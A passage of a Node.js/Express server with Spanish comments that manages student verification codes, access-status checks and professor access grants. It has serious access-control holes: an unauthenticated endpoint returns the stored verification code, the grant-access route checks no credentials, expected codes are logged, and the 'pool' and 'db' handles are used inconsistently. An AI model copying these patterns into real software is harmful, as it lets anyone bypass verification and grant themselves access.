    const { username, verificationCode } = req.body;
    
    if (!username || !verificationCode) {
        return res.status(400).json({ 
            success: false,
            message: 'Usuario y código de verificación son requeridos' 
        });
    }
    
    // Buscar el código de verificación válido más reciente para el usuario
    db.get(`SELECT vc.code, vc.used, lr.status 
            FROM verification_codes vc
            JOIN login_requests lr ON vc.username = lr.username
            WHERE vc.username = ? AND lr.status = 'approved' AND vc.used = FALSE
            ORDER BY vc.created_at DESC LIMIT 1`, 
        [username], (err, result) => {
        if (err) {
            console.error('Error al buscar código de verificación:', err);
            return res.status(500).json({ 
                success: false,
                message: 'Error interno del servidor' 
            });
        }
        
        if (!result) {
            return res.status(404).json({ 
                success: false,
                message: 'No se encontró un código de verificación válido para este usuario' 
            });
        }
        
        // Verificar si el código coincide
        if (result.code === verificationCode) {
            // Marcar el código como usado y aprobado
            db.run(`UPDATE verification_codes 
                    SET used = TRUE, validation_status = 'approved', validated_at = datetime('now')
                    WHERE username = ? AND code = ? AND used = FALSE`, 
                [username, verificationCode], (updateErr) => {
                if (updateErr) {
                    console.error('Error al marcar código como usado:', updateErr);
                }
                
                // Auto-conceder acceso (soporte para flujo Google)
                db.get(`SELECT username FROM access_grants WHERE username = ?`, [username], (gErr, row) => {
                    const grant = (cb) => db.run(`INSERT INTO access_grants (username, granted, granted_at) VALUES (?, TRUE, datetime('now'))`, [username], cb);
                    const update = (cb) => db.run(`UPDATE access_grants SET granted = TRUE, granted_at = datetime('now') WHERE username = ?`, [username], cb);
                    if (gErr) {
                        console.error('Error al consultar access_grants:', gErr);
                    } else if (!row) {
                        grant(() => {});
                    } else {
                        update(() => {});
                    }
                });

                console.log(`Código de verificación validado exitosamente para ${username}`);
                res.json({ 
                    success: true,
                    message: `Usuario creado correctamente, en unos momentos verás en drive una carpeta llamada Recordings`
                });
            });
        } else {
            // Marcar el código como rechazado
            db.run(`UPDATE verification_codes 
                    SET validation_status = 'rejected', validated_at = datetime('now')
                    WHERE username = ? AND code = ?`, 
                [username, result.code], (updateErr) => {
                if (updateErr) {
                    console.error('Error al marcar código como rechazado:', updateErr);
                }
            });
            
            console.log(`Código incorrecto para ${username}. Esperado: ${result.code}, Recibido: ${verificationCode}`);
            res.json({ 
                success: false,
                message: `❌ Código incorrecto para ${username}. Inténtalo de nuevo.`
            });
        }
    });
});

// API para verificar estado de validación de código (estudiante)
app.get('/api/student/code-status/:username/:code', (req, res) => {
    const { username, code } = req.params;
    
    console.log(`Debug - Verificando estado para: ${username}, código: ${code}`);
    
    db.get(`SELECT validation_status, validated_at, used 
            FROM verification_codes 
            WHERE username = ? AND code = ?
            ORDER BY created_at DESC LIMIT 1`, 
        [username, code], (err, result) => {
        if (err) {
            console.error('Error al verificar estado del código:', err);
            return res.status(500).json({ 
                success: false,
                message: 'Error interno del servidor' 
            });
        }
        
        console.log(`Debug - Resultado de la consulta:`, result);
        
        if (!result) {
            console.log(`Debug - No se encontró código para ${username}/${code}`);
            return res.json({ 
                success: false,
                status: 'not_found',
                message: 'Código no encontrado'
            });
        }
        
        console.log(`Debug - Estado encontrado: ${result.validation_status}`);
        
        res.json({ 
            success: true,
            status: result.validation_status,
            validated_at: result.validated_at,
            used: result.used
        });
    });
});

// API para verificar si el profesor ya concedió acceso (estudiante)
app.get('/api/student/access-status/:username', (req, res) => {
    const { username } = req.params;
    if (!pool) return res.status(503).json({ success: false, message: 'DB no configurada' });
    db.get(`SELECT granted, granted_at FROM access_grants WHERE username = ?`, [username], (err, result) => {
        if (err) {
            return res.status(500).json({ success: false, message: 'Error interno del servidor' });
        }
        if (!result) {
            return res.json({ success: true, granted: false });
        }
        return res.json({ success: true, granted: !!result.granted, granted_at: result.granted_at });
    });
});

// API para verificar estado de solicitud (estudiante)
app.get('/api/student/request-status/:username', (req, res) => {
    const { username } = req.params;
    
    db.get(`SELECT status, verification_code, processed_at, message, auth_provider 
            FROM login_requests 
            WHERE username = ? 
            ORDER BY created_at DESC LIMIT 1`, 
        [username], (err, request) => {
        if (err) {
            console.error('Error al verificar estado:', err);
            return res.status(500).json({ message: 'Error interno del servidor' });
        }
        
        if (!request) {
            return res.status(404).json({ message: 'No se encontró solicitud' });
        }
        
        res.json({ request });
    });
});

// API para que el profesor conceda acceso final al alumno
app.post('/api/professor/grant-access', (req, res) => {
    if (!pool) return res.status(503).json({ success: false, message: 'DB no configurada' });
    const { username } = req.body;
    if (!username) return res.status(400).json({ success: false, message: 'Usuario requerido' });
    db.get(`SELECT username FROM access_grants WHERE username = ?`, [username], (err, row) => {
        if (err) {
            return res.status(500).json({ success: false, message: 'Error interno del servidor' });
        }
        if (!row) {
            db.run(`INSERT INTO access_grants (username, granted, granted_at) VALUES (?, TRUE, datetime('now'))`, [username], (insErr) => {
                if (insErr) {
                    return res.status(500).json({ success: false, message: 'Error al conceder acceso' });
                }
                return res.json({ success: true, message: 'Acceso concedido' });
            });
        } else {
            db.run(`UPDATE access_grants SET granted = TRUE, granted_at = datetime('now') WHERE username = ?`, [username], (updErr) => {
                if (updErr) {
                    return res.status(500).json({ success: false, message: 'Error al conceder acceso' });
                }
                return res.json({ success: true, message: 'Acceso concedido' });
            });
        }
    });
});

// Iniciar servidor
initializeDatabase();
app.listen(PORT, () => {
    console.log(`Servidor ejecutándose en http://localhost:${PORT}`);
});

// Manejar cierre graceful
process.on('SIGINT', async () => {
    try {
        console.log('\nCerrando servidor...');
        if (pool) await pool.end();
        console.log('Conexión a la base de datos cerrada.');
    } catch (err) {
        console.error('Error al cerrar la base de datos:', err.message);
    } finally {
        process.exit(0);
    }
});